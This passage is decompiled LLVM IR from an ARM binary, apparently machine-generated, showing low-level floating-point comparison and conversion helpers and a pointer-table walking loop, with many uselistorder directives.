  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 134, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 135, 70, 71, 136, 72, 137, 73, 138, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 129, 1, 86, 89, 88, 87, 92, 91, 90, 93, 94, 95, 96, 97, 98, 99, 100, 101, 139, 102, 103, 104, 128, 109, 105, 106, 110, 107, 108, 111, 116, 112, 113, 115, 114, 117, 119, 118, 130, 120, 121, 122, 123, 124, 125, 126, 131, 133, 127, 132 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 12, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 16, 26, 10, 15, 11 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 15, 108, 109, 110, 111, 112, 113, 114, 115, 117, 116, 0, 118, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 13, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 2, 1, 16, 17, 18, 19, 20, 72, 3, 73, 74, 75, 76, 77, 78, 79, 119, 4, 120, 121, 122, 80, 82, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 5, 136, 137, 138, 139, 6, 140, 141, 142, 143, 144, 145, 146, 147, 7, 148, 149, 150, 151, 152, 153, 154, 203, 208, 30, 31, 21, 22, 23, 32, 33, 34, 35, 181, 182, 183, 97, 98, 8, 99, 100, 101, 102, 103, 104, 9, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 184, 185, 186, 187, 188, 10, 14, 189, 105, 106, 107, 190, 11, 191, 192, 165, 166, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 24, 25, 26, 167, 168, 169, 170, 27, 204, 205, 206, 207, 28, 193, 194, 195, 196, 12, 197, 198, 199, 200, 29, 201, 202 }
  uselistorder i32* @r5, { 163, 164, 165, 30, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 31, 32, 182, 33, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 0, 199, 72, 73, 74, 75, 76, 77, 78, 9, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 7, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 27, 34, 10, 5, 35, 108, 112, 109, 110, 111, 23, 117, 113, 114, 115, 116, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 11, 211, 212, 118, 119, 12, 121, 120, 6, 125, 13, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 139, 25, 141, 47, 48, 49, 50, 51, 52, 317, 318, 213, 214, 215, 216, 217, 218, 219, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 2, 233, 234, 235, 236, 237, 238, 53, 54, 55, 331, 332, 333, 334, 335, 3, 336, 337, 338, 61, 62, 63, 64, 65, 66, 36, 37, 38, 39, 40, 41, 42, 67, 14, 1, 68, 69, 70, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 339, 340, 341, 342, 122, 123, 124, 239, 15, 240, 241, 242, 243, 244, 16, 245, 246, 247, 248, 249, 153, 154, 155, 156, 157, 158, 17, 300, 301, 302, 18, 303, 304, 159, 160, 161, 162, 305, 306, 307, 250, 251, 28, 252, 253, 19, 254, 255, 256, 257, 258, 259, 26, 260, 261, 262, 263, 29, 267, 20, 268, 269, 270, 271, 272, 273, 274, 275, 8, 276, 277, 278, 279, 280, 281, 43, 44, 264, 4, 265, 266, 46, 45, 24, 343, 344, 308, 309, 310, 311, 21, 312, 313, 56, 57, 58, 59, 22, 60, 282, 283, 284, 285, 286, 287, 314, 315, 316, 71 }
  uselistorder i32 %arg4, { 7, 2, 4, 3, 6, 9, 8, 0, 1, 5, 10 }
  uselistorder i32 %arg3, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_15590, { 1, 0 }
  uselistorder label %dec_label_pc_15574, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_15540, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_15438, { 1, 0 }
  uselistorder label %dec_label_pc_15420, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_155b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_155b0:
  store i32 -1, i32* @ip, align 4
  %v0_155b4 = call i32 @function_155c4()
  ret i32 %v0_155b4
}

define i32 @function_155b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_155b8:
  store i32 1, i32* @ip, align 4
  %v0_155bc = call i32 @function_155c4()
  ret i32 %v0_155bc

; uselistorder directives
  uselistorder i32 ()* @function_155c4, { 1, 0 }
}

define i32 @function_155c0() local_unnamed_addr {
dec_label_pc_155c0:
  %v0_155c0 = load i32, i32* @r0, align 4
  ret i32 %v0_155c0
}

define i32 @function_155c4() local_unnamed_addr {
dec_label_pc_155c4:
  %v0_155c4 = load i32, i32* @ip, align 4
  %v0_155c8 = load i32, i32* @r0, align 4
  %v2_155c8 = mul i32 %v0_155c8, 2
  %v2_155c8.off = add i32 %v2_155c8, 4194303
  %tmp = icmp ult i32 %v2_155c8.off, 2097152
  %v0_155d0 = load i32, i32* @r2, align 4
  %v2_155d0 = mul i32 %v0_155d0, 2
  br i1 %tmp, label %dec_label_pc_15620, label %bb

bb:                                               ; preds = %dec_label_pc_155c4
  %v2_155d0.off = add i32 %v2_155d0, 4194303
  %tmp26 = icmp ult i32 %v2_155d0.off, 2097152
  br i1 %tmp26, label %dec_label_pc_15614, label %dec_label_pc_155dc

dec_label_pc_155dc:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15634, %bb
  %v0_155dc = load i32, i32* @r1, align 4
  %v4_155dc = or i32 %v0_155dc, %v2_155c8
  store i32 %v4_155dc, i32* @ip, align 4
  %v6_155dc = icmp eq i32 %v4_155dc, 0
  br i1 %v6_155dc, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_155dc
  %v1_155e0 = load i32, i32* @r3, align 4
  %v5_155e0 = or i32 %v1_155e0, %v2_155d0
  store i32 %v5_155e0, i32* @ip, align 4
  %v7_155e0 = icmp eq i32 %v5_155e0, 0
  br i1 %v7_155e0, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_155dc, %bb14
  %v3_155e4 = xor i32 %v0_155d0, %v0_155c8
  %v5_155e4 = icmp eq i32 %v3_155e4, 0
  br i1 %v5_155e4, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_155e8.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_155e8 = phi i32 [ %v2_155e8.pre, %.thread..thread1_crit_edge ], [ %v1_155e0, %bb14 ]
  %v5_155e8 = icmp eq i32 %v2_155e8, %v0_155dc
  br i1 %v5_155e8, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_155d0, %v0_155c8
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_155f8.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_155e4, %.thread ]
  %v3_155f8 = icmp slt i32 %v2_155f8.pre-phi, 0
  br i1 %v3_155f8, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_155fc = icmp eq i32 %v0_155c8, %v0_155d0
  br i1 %v10_155fc, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_15600 = load i32, i32* @r3, align 4
  %v4_15600 = icmp ult i32 %v0_155dc, %v2_15600
  br i1 %v4_15600, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_155fc = icmp ult i32 %v0_155c8, %v0_155d0
  br i1 %v4_155fc, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_155d0, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_15604 = and i32 %v0_155d0, 1073741824
  %v3_15604 = icmp eq i32 %v2_15604, 0
  %v4_15604 = ashr i32 %v0_155d0, 31
  br i1 %v3_15604, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_15608.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_15604, %bb19 ]
  %v5_15608 = sub nsw i32 -1, %v4_15608.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1560c = phi i32 [ %v4_15604, %bb19 ], [ %v5_15608, %.thread7 ]
  %v1_1560c = or i32 %v0_1560c, 1
  ret i32 %v1_1560c

dec_label_pc_15614:                               ; preds = %bb
  br label %dec_label_pc_15628

dec_label_pc_15620:                               ; preds = %dec_label_pc_155c4
  %v0_15620 = load i32, i32* @r1, align 4
  %v4_15620 = mul i32 %v0_155c8, 4096
  %v5_15620 = or i32 %v0_15620, %v4_15620
  store i32 %v5_15620, i32* @ip, align 4
  %v7_15620 = icmp eq i32 %v5_15620, 0
  br i1 %v7_15620, label %dec_label_pc_15620.dec_label_pc_15628_crit_edge, label %dec_label_pc_1563c

dec_label_pc_15620.dec_label_pc_15628_crit_edge:  ; preds = %dec_label_pc_15620
  %v2_155d0.off25 = add i32 %v2_155d0, 4194303
  %tmp27 = icmp ult i32 %v2_155d0.off25, 2097152
  br label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_15620.dec_label_pc_15628_crit_edge, %dec_label_pc_15614
  %v3_1562c.pre-phi = phi i1 [ %tmp27, %dec_label_pc_15620.dec_label_pc_15628_crit_edge ], [ true, %dec_label_pc_15614 ]
  br i1 %v3_1562c.pre-phi, label %dec_label_pc_15634, label %dec_label_pc_155dc

dec_label_pc_15634:                               ; preds = %dec_label_pc_15628
  %v0_15634 = load i32, i32* @r3, align 4
  %v4_15634 = mul i32 %v0_155d0, 4096
  %v5_15634 = or i32 %v0_15634, %v4_15634
  store i32 %v5_15634, i32* @ip, align 4
  %v7_15634 = icmp eq i32 %v5_15634, 0
  br i1 %v7_15634, label %dec_label_pc_155dc, label %dec_label_pc_1563c

dec_label_pc_1563c:                               ; preds = %dec_label_pc_15620, %dec_label_pc_15634
  ret i32 %v0_155c4

; uselistorder directives
  uselistorder i32 %v4_15604, { 1, 0 }
  uselistorder i32 %v1_155e0, { 1, 0 }
  uselistorder i32 %v0_155dc, { 2, 0, 1 }
  uselistorder i32 %v2_155d0, { 0, 2, 1 }
  uselistorder i32 %v0_155d0, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_155c8, { 1, 0 }
  uselistorder i32 %v0_155c8, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 31, { 15, 6, 4, 12, 13, 16, 5, 17, 18, 14, 3, 19, 2, 1, 0, 7, 9, 8, 10, 20, 21, 11 }
  uselistorder i32* @ip, { 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 4, 24, 25, 26, 27, 28, 29, 30, 8, 31, 32, 33, 34, 35, 36, 37, 38, 10, 11, 5, 39, 40, 41, 42, 12, 44, 43, 0, 45, 46, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 47, 48, 49, 50, 51, 52, 53, 54, 67, 68, 7, 69, 6, 70, 9, 14, 117, 114, 115, 116, 1, 118, 55, 56, 57, 58, 59, 2, 60, 61, 62, 63, 64, 65, 13, 71, 66 }
  uselistorder label %dec_label_pc_1563c, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_155dc, { 1, 0, 2 }
}

define i32 @function_15644() local_unnamed_addr {
dec_label_pc_15644:
  %v0_15644 = load i32, i32* @r0, align 4
  %v0_15648 = load i32, i32* @r2, align 4
  store i32 %v0_15648, i32* @r0, align 4
  store i32 %v0_15644, i32* @r2, align 4
  %v0_15650 = load i32, i32* @r1, align 4
  %v0_15654 = load i32, i32* @r3, align 4
  store i32 %v0_15654, i32* @r1, align 4
  store i32 %v0_15650, i32* @r3, align 4
  %v0_1565c = call i32 @function_15660()
  ret i32 %v0_1565c

; uselistorder directives
  uselistorder i32* @r3, { 5, 6, 14, 15, 1, 16, 17, 18, 0, 19, 3, 20, 21, 22, 23, 24, 10, 2, 11, 12, 13, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 4, 43, 38, 41, 39, 40, 44, 45, 42, 36, 9, 37, 8, 7 }
  uselistorder i32* @r1, { 31, 32, 94, 95, 25, 96, 97, 98, 99, 100, 101, 102, 24, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 33, 34, 116, 117, 35, 0, 4, 118, 13, 119, 120, 121, 122, 123, 124, 125, 126, 127, 12, 128, 129, 130, 131, 132, 133, 15, 134, 135, 136, 137, 138, 139, 140, 141, 142, 53, 54, 2, 55, 56, 27, 57, 60, 58, 59, 22, 21, 38, 36, 37, 39, 61, 62, 63, 64, 65, 66, 67, 68, 5, 6, 177, 178, 143, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 7, 41, 42, 18, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 9, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 8, 240, 241, 17, 179, 180, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 16, 28, 29, 30, 242, 3, 243, 46, 51, 49, 181, 186, 187, 190, 188, 189, 182, 183, 184, 185, 80, 86, 244, 245, 246, 23, 163, 164, 165, 20, 166, 81, 82, 83, 84, 85, 10, 87, 88, 89, 11, 19, 167, 168, 169, 170, 171, 1, 172, 173, 174, 14, 40, 191, 47, 175, 48, 176, 26, 43, 44, 45, 50, 52, 90, 91, 92, 93, 192, 193 }
  uselistorder i32* @r2, { 20, 21, 101, 102, 103, 10, 104, 105, 106, 107, 108, 109, 110, 111, 112, 76, 77, 11, 78, 79, 15, 80, 81, 13, 22, 23, 24, 82, 83, 84, 143, 14, 113, 85, 86, 87, 88, 89, 26, 12, 7, 161, 162, 163, 164, 114, 115, 116, 117, 118, 119, 120, 121, 122, 2, 123, 124, 125, 144, 145, 8, 126, 16, 25, 165, 166, 17, 18, 167, 168, 3, 169, 171, 172, 176, 38, 170, 146, 150, 151, 154, 152, 153, 147, 148, 149, 90, 173, 27, 127, 128, 129, 5, 91, 1, 174, 6, 175, 130, 131, 132, 133, 9, 134, 135, 4, 136, 0, 137, 155, 156, 157, 39, 40, 138, 41, 139, 19, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 92, 93, 94, 95, 96, 97, 98, 99, 142, 158, 159, 160, 100, 140, 141 }
}

define i32 @function_15660() local_unnamed_addr {
dec_label_pc_15660:
  %stack_var_-8 = alloca i32, align 4
  %v3_15660 = load i32, i32* @r0, align 4
  store i32 %v3_15660, i32* %stack_var_-8, align 4
  %v0_15664 = call i32 @function_155c0()
  store i1 true, i1* @cpsr_c, align 1
  %v1_15668 = icmp slt i32 %v0_15664, 0
  %v2_15668 = icmp eq i32 %v0_15664, 0
  store i1 %v2_15668, i1* @cpsr_z, align 1
  br i1 %v1_15668, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_15660
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_15660, %bb
  %v2_15670 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_15670

; uselistorder directives
  uselistorder i32 ()* @function_155c0, { 3, 2, 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_15674() local_unnamed_addr {
dec_label_pc_15674:
  %stack_var_-8 = alloca i32, align 4
  %v0_15674 = load i32, i32* @lr, align 4
  store i32 %v0_15674, i32* %stack_var_-8, align 4
  %v0_15678 = call i32 @function_15660()
  %v0_1567c = load i1, i1* @cpsr_z, align 1
  %.v0_15678. = zext i1 %v0_1567c to i32
  store i32 %.v0_15678., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15674)
  %v0_15688 = load i32, i32* @lr, align 4
  store i32 %v0_15688, i32* %stack_var_-8, align 4
  %v0_1568c = call i32 @function_15660()
  %v0_15690 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_15690 to i32
  %.v0_1568c. = xor i32 %tmp2, 1
  store i32 %.v0_1568c., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15688)
  %v0_1569c = load i32, i32* @lr, align 4
  store i32 %v0_1569c, i32* %stack_var_-8, align 4
  %v0_156a0 = call i32 @function_15660()
  %v0_156a4 = load i1, i1* @cpsr_z, align 1
  %v1_156a4 = load i1, i1* @cpsr_c, align 1
  %v2_156a4 = xor i1 %v1_156a4, true
  %v3_156a4 = or i1 %v0_156a4, %v2_156a4
  %.v0_156a0 = select i1 %v3_156a4, i32 1, i32 %v0_156a0
  %v2_156a8 = xor i1 %v0_156a4, true
  %v3_156a8 = and i1 %v1_156a4, %v2_156a8
  %..v0_156a0 = select i1 %v3_156a8, i32 0, i32 %.v0_156a0
  store i32 %..v0_156a0, i32* @r0, align 4
  %v2_156ac = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_156ac)
  %v0_156b0 = load i32, i32* @lr, align 4
  store i32 %v0_156b0, i32* %stack_var_-8, align 4
  %v0_156b4 = call i32 @function_15644()
  %v0_156b8 = load i1, i1* @cpsr_z, align 1
  %v1_156b8 = load i1, i1* @cpsr_c, align 1
  %v2_156b8 = xor i1 %v1_156b8, true
  %v3_156b8 = or i1 %v0_156b8, %v2_156b8
  %.v0_156b4 = select i1 %v3_156b8, i32 1, i32 %v0_156b4
  %v2_156bc = xor i1 %v0_156b8, true
  %v3_156bc = and i1 %v1_156b8, %v2_156bc
  %..v0_156b4 = select i1 %v3_156bc, i32 0, i32 %.v0_156b4
  store i32 %..v0_156b4, i32* @r0, align 4
  %v2_156c0 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_156c0)
  %v0_156c4 = load i32, i32* @lr, align 4
  store i32 %v0_156c4, i32* %stack_var_-8, align 4
  %v0_156c8 = call i32 @function_15644()
  %v0_156cc = load i1, i1* @cpsr_c, align 1
  %tmp3 = zext i1 %v0_156cc to i32
  %.v0_156c8. = xor i32 %tmp3, 1
  call void @__pseudo_branch(i32 %v0_156c4)
  ret i32 %.v0_156c8.

; uselistorder directives
  uselistorder i1 %v1_156b8, { 1, 0 }
  uselistorder i1 %v1_156a4, { 1, 0 }
  uselistorder i32 ()* @function_15644, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 66, 0, 5, 6, 7, 8, 56, 57, 62, 58, 59, 60, 63, 9, 10, 11, 12, 13, 53, 61, 14, 15, 17, 16, 18, 67, 64, 21, 22, 23, 24, 19, 20, 65, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 51, 38, 39, 36, 37, 68, 69, 70, 71, 40, 41, 52, 72, 73, 42, 43, 44, 54, 45, 46, 47, 48, 55, 49, 50 }
  uselistorder i1 false, { 37, 43, 15, 16, 88, 89, 90, 91, 92, 93, 94, 95, 0, 12, 44, 38, 45, 46, 47, 48, 49, 6, 96, 7, 50, 18, 51, 52, 53, 17, 54, 55, 56, 57, 58, 59, 60, 61, 62, 42, 19, 63, 29, 20, 30, 64, 65, 66, 22, 21, 13, 14, 67, 68, 69, 2, 3, 70, 31, 32, 71, 33, 34, 23, 39, 40, 8, 24, 72, 35, 36, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 41, 97, 5, 4, 9, 1, 27, 26, 28, 25, 10, 11, 98, 99, 100, 101 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 19, 20, 21, 22, 23, 24, 13, 14, 15, 16, 7, 17, 18, 26, 27, 28, 29, 30, 31, 32, 0, 8, 33, 34, 1, 9, 10, 11, 12, 25 }
  uselistorder i32 ()* @function_15660, { 2, 1, 0, 3 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 16, 72, 73, 74, 75, 76, 77, 78, 79, 80, 17, 18, 81, 19, 20, 82, 32, 33, 34, 35, 38, 39, 40, 4, 41, 42, 43, 44, 23, 24, 25, 83, 84, 85, 86, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 88, 87, 0, 89, 90, 1, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 5, 136, 137, 138, 6, 139, 140, 141, 7, 142, 143, 144, 145, 146, 147, 148, 149, 114, 91, 92, 93, 94, 95, 27, 28, 96, 8, 98, 99, 97, 150, 30, 124, 151, 152, 115, 116, 117, 153, 46, 36, 37, 100, 101, 57, 58, 59, 60, 61, 62, 119, 63, 64, 120, 121, 102, 103, 104, 105, 106, 107, 108, 10, 9, 2, 109, 110, 111, 112, 3, 113, 118, 21, 22, 122, 29, 123, 125, 26, 31, 65, 66, 67, 68, 69, 70, 71 }
}

define i32 @function_156d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_156d8:
  %v1_156d8 = icmp slt i32 %arg1, 0
  %v2_156d8 = mul i32 %arg1, 2
  br i1 %v1_156d8, label %dec_label_pc_1570c, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %dec_label_pc_156d8
  %v1_156e0 = add i32 %v2_156d8, 2097152
  %v2_156e0 = icmp ugt i32 %v2_156d8, -2097153
  br i1 %v2_156e0, label %dec_label_pc_15714, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156e0
  %v6_156e0 = icmp slt i32 %v1_156e0, 0
  br i1 %v6_156e0, label %dec_label_pc_156ec, label %dec_label_pc_1570c

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156e8
  %v4_156f0 = sdiv i32 %v1_156e0, 2097152
  %v5_156f0 = sub nsw i32 -993, %v4_156f0
  %v11_156f0 = icmp slt i32 %v5_156f0, 0
  br i1 %v11_156f0, label %dec_label_pc_1571c, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156ec
  %v3_156f8 = mul i32 %arg1, 2048
  %v4_15700 = udiv i32 %arg2, 2097152
  %v1_156fc = or i32 %v3_156f8, %v4_15700
  %v5_15700 = or i32 %v1_156fc, -2147483648
  %v6_15704 = lshr i32 %v5_15700, %v5_156f0
  ret i32 %v6_15704

dec_label_pc_1570c:                               ; preds = %dec_label_pc_156e8, %dec_label_pc_156d8
  ret i32 0

dec_label_pc_15714:                               ; preds = %dec_label_pc_156e0
  %v4_15714 = mul i32 %arg1, 4096
  %v5_15714 = or i32 %v4_15714, %arg2
  %v7_15714 = icmp eq i32 %v5_15714, 0
  br i1 %v7_15714, label %dec_label_pc_1571c, label %dec_label_pc_15724

dec_label_pc_1571c:                               ; preds = %dec_label_pc_15714, %dec_label_pc_156ec
  ret i32 -1

dec_label_pc_15724:                               ; preds = %dec_label_pc_15714
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 17, 5, 6, 18, 7, 8, 9, 10, 19, 11, 12, 20, 13, 21, 14, 15, 16 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 178, 35, 36, 37, 150, 38, 39, 40, 41, 42, 43, 149, 44, 45, 46, 47, 48, 81, 82, 49, 161, 101, 102, 163, 141, 142, 162, 103, 164, 165, 166, 167, 168, 79, 117, 152, 50, 153, 154, 169, 170, 171, 51, 83, 84, 85, 86, 87, 88, 179, 180, 143, 144, 145, 113, 52, 146, 89, 196, 197, 106, 198, 199, 92, 200, 91, 201, 90, 192, 181, 78, 182, 183, 53, 54, 184, 185, 0, 118, 119, 156, 120, 157, 121, 158, 55, 147, 104, 155, 56, 202, 105, 172, 57, 122, 173, 174, 58, 123, 175, 176, 114, 160, 59, 93, 151, 60, 61, 94, 95, 96, 108, 97, 109, 98, 99, 100, 80, 193, 194, 186, 187, 115, 62, 63, 64, 148, 65, 116, 188, 110, 107, 66, 189, 190, 191, 195, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 124, 125, 126, 127, 128, 129, 130, 131, 111, 132, 159, 112, 133, 134, 135, 136, 177, 77, 137, 138, 139, 140 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_1572c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1572c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15730 = load i32, i32* @global_var_18000.485, align 4
  %v7_15734 = icmp eq i32 %v3_15730, -1
  %v3_15738 = load i32, i32* @r4, align 4
  store i32 %v3_15738, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_18000.485 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_15734, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_1572c
  store i32 %v3_15738, i32* %r4.global-to-local, align 4
  %v9_15740 = load i32, i32* @r0, align 4
  ret i32 %v9_15740

.preheader:                                       ; preds = %dec_label_pc_1572c, %.preheader
  %v0_15748 = phi i32 [ %v3_1574c, %.preheader ], [ %v3_15730, %dec_label_pc_1572c ]
  call void @__pseudo_branch(i32 %v0_15748)
  %v0_1574c = load i32, i32* %r4.global-to-local, align 4
  %v1_1574c = add i32 %v0_1574c, -4
  %v2_1574c = inttoptr i32 %v1_1574c to i32*
  %v3_1574c = load i32, i32* %v2_1574c, align 4
  store i32 %v1_1574c, i32* %r4.global-to-local, align 4
  %v3_15750 = icmp eq i32 %v3_1574c, -1
  br i1 %v3_15750, label %dec_label_pc_15758, label %.preheader

dec_label_pc_15758:                               ; preds = %.preheader
  %v2_15758 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15758, i32* %r4.global-to-local, align 4
  %v8_15758 = load i32, i32* @r0, align 4
  ret i32 %v8_15758

; uselistorder directives
  uselistorder i32 %v3_1574c, { 1, 0 }
  uselistorder i32 %v3_15730, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 52, 20, 21, 22, 43, 23, 24, 53, 54, 55, 6, 25, 26, 27, 56, 57, 58, 7, 28, 29, 30, 59, 60, 61, 8, 31, 32, 62, 19, 18, 63, 64, 65, 17, 16, 15, 14, 33, 34, 35, 36, 37, 3, 38, 4, 39, 5, 66, 13, 40, 44, 1, 48, 49, 50, 41, 51, 10, 9, 45, 46, 47, 12, 11, 42, 0, 2 }
